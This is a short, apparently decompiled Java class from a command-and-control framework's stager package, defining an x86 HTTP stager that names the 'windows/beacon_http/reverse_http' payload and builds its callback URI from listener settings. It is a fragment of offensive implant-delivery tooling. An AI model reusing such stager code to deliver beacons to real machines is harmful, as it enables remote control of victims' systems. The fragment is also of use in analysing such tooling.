package stagers;

import common.ScListener;

public class BeaconHTTPStagerX86 extends GenericHTTPStagerX86 {
   public BeaconHTTPStagerX86(ScListener var1) {
      super(var1);
   }

   public String payload() {
      return "windows/beacon_http/reverse_http";
   }

   public String getURI() {
      String var10000 = this.getConfig().getURI();
      return var10000 + this.getConfig().getQueryString();
   }
}
